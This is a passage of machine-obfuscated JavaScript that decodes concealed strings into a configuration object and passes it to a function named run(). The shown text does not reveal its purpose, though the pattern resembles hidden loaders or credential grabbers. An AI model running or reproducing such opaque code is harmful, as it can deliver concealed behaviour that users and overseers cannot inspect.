            _0x3f0240 = _0x434e['jizdLe'](_0x3f0240, _0x3d82c6), _0x5b5504[_0x3a0e06] = _0x3f0240;
        } else _0x3f0240 = _0x1b8007;
        return _0x3f0240;
    }, _0x434e(_0x5b5504, _0x12d599);
}

function _0x5ed307(_0x330960, _0x19fb51, _0x13ddb9, _0x5e0dfa, _0x1b0596) {
    return _0x434e(_0x330960 - -0x2dc, _0x1b0596);
}
var _0x1db47d = {};

function _0x2b7978(_0x29462f, _0x2f12f7, _0x3e364d, _0x2b1ceb, _0x1077ee) {
    return _0x434e(_0x29462f - 0x260, _0x2b1ceb);
}
_0x1db47d[_0x548da2('dTin', 0x1ef, 0x1e1, 0x1d2, 0x1e0) + 'ok'] = _0x5ed307(-0x170, -0x17d, -0x182, -0x166, 'R)E%') + _0x5ed307(-0x16e, -0x177, -0x17b, -0x176, 'uvH0') + _0x5ed307(-0x168, -0x15a, -0x174, -0x15f, '^y3D') + _0x548da2('dPMd', 0x1dc, 0x1d4, 0x1e1, 0x1d4) + _0x5c384a(0x1d2, 0x1c2, 'yv[r', 0x1e1, 0x1dd) + 'K', run(_0x1db47d);